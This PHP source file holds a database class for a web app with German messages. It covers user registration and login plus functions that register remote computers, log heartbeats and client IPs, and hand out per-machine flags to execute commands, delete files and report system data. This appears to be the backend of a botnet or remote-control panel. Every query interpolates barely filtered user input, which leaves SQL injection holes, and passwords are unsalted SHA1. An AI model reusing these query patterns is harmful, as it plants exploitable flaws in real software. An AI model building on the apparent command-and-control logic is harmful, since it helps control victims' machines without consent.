<?php

class Querys extends Functions {

	
	public function registerUser($post){
		
	
		
	/*	
		$query = $this->prep("INSERT INTO `users` (`name`, `email`, `password`, `geschlecht`, `geburtstag`) VALUES (:name, :email, 'asd', 'asd', 'asd')", 
				array(array(':name', $post['name'], PDO::PARAM_STR), array(':email', $post['email'], PDO::PARAM_STR)));
		*/
		
		/*
		
		
		$test = $this->fetch_assoc("Select * from users", array());
		
		var_dump($test);
		
		*/
		
		$name = $this->make_safe($post['name']);
		$email = $this->make_safe($post['email']);
		$password = $this->make_safe(sha1($post['password']));
		$password2 = $this->make_safe(sha1($post['password2']));
		$geschlecht = $this->make_safe($post['geschlecht']);
		$geburtstag = $this->make_safe($post['tag'].'.'.$post['monat'].'.'.$post['jahr']);
		
		if($password == $password2 && !$this->emailExists($email)){
			$this->db_assoc("INSERT INTO `users` (`id`, `name`, `email`, `password`, `geschlecht`, `geburtstag`) VALUES (NULL, '$name', '$email', '$password', '$geschlecht', '$geburtstag')");

			$this->alertSuccess("Erfolgreich registriert.</div>");
			
			header("Location: " . $this->_config['basepath']."/login");
		} else {
			$this->alertError("Bite &uuml;berpr&uuml;fen Sie ihre Angaben.");
		}
		
	}
	
	public function log($userId, $log){
		$this->db_assoc("INSERT INTO `log` (`fk_user`, `log`) VALUES ('$userId', '$log')");
	}
	
	public function loginUser($post){
		$email = $this->make_safe($post['email']);
		$password = $this->make_safe(sha1($post['password']));
		$i = $this->get_query_count("SELECT id FROM `users` WHERE `email` = '$email' AND `password` = '$password'");
		if($i == 1){
			
			$this->alertSuccess("Erfolgreich eingeloggt.");
			
			$_SESSION['userid'] = $this->getUserIdByEmail($email);
			
			$this->log($_SESSION['userid'], "login");
			
			header("Location: " . $this->_config['basepath']."/surveys");
		} else {
			$this->alertError("Bite &uuml;berpr&uuml;fen Sie ihre Angaben.");
		}
		
	}
	
	public function getCurrentUser($id){
		return $this->db_assoc("SELECT * FROM `users` WHERE `id` = '$id'");
	}
	
	public function getUserIdByEmail($email){
		$email = $this->make_safe($email);
		return $this->get_column("SELECT id FROM `users` WHERE `email` = '$email'");
	}
	
	public function emailExists($email){
		$email = $this->make_safe($email);
		$i = $this->get_query_count("SELECT id FROM `users` WHERE `email` = '$email'");
		return ($i >= 1 ? true : false);
	}
	
	
	//ASDASSSSSSSSSSSSSSSSSSS
	
	public function whatToExexute($uid){
		$uid = $this->make_safe($uid);
		$i = $this->db_assoc("SELECT ex_commands, del_files, report_system FROM execute WHERE fk_uid = '$uid'");
		return json_encode($i);
	}

	public function newComputer($uid){
		$uid = $this->make_safe($uid);
		$this->addComputer($uid, 'N/A', 'N/A');
		$this->db_assoc("INSERT INTO execute (id, fk_uid, ex_commands, del_files, report_system) VALUES (NULL, '$uid', '0', '0', '1')");
	}

	public function updateExecute(){
		//UPDATE execute` SET ex_commands = '1', dl_files = '1', report_system = '0' WHERE id =1;
	}

	public function computerExists($uid){
		$uid = $this->make_safe($uid);
		$i = $this->get_query_count("SELECT id FROM computers WHERE uid = '$uid'");
		return ($i == 1 ? true : false);
	}


	public function isSomethingToEx($uid){
		$uid = $this->make_safe($uid);
		$i = $this->get_query_count("SELECT * FROM execute WHERE fk_uid = '$uid' AND ex_commands =1 OR dl_files =1 OR report_system =1");
		return ($i == 1 ? true : false);
	}

	public function addComputer($uid, $os, $pcname){
		$ip = $_SERVER["REMOTE_ADDR"];
		$uid = $this->make_safe($uid);
		$os = $this->make_safe($os);
		$pcname = $this->make_safe($pcname);
			
		$computer = $this->db_assoc("INSERT INTO computers (id, uid, ip, os, name, date) VALUES (NULL, '$uid', '$ip', '$os', '$pcname', CURRENT_TIMESTAMP)");
	}

	public function liveBit($uid){
		$ip = $_SERVER["REMOTE_ADDR"];
		$uid = $this->make_safe($uid);
			
		$computer = $this->db_assoc("INSERT INTO ping (id, uid, ip, date) VALUES (NULL, '$uid', '$ip', CURRENT_TIMESTAMP)");
	}

	public function addFile($path, $name){
		$file = $this->db_assoc("INSERT INTO files (id, name, path, date) VALUES (NULL, '$name', '$path', CURRENT_TIMESTAMP)");
	}

	//
	
	
	
	
	
	
	
	
	
	public function make_safe($variable){
		return strip_tags(trim(stripslashes($variable)));
	}
		


}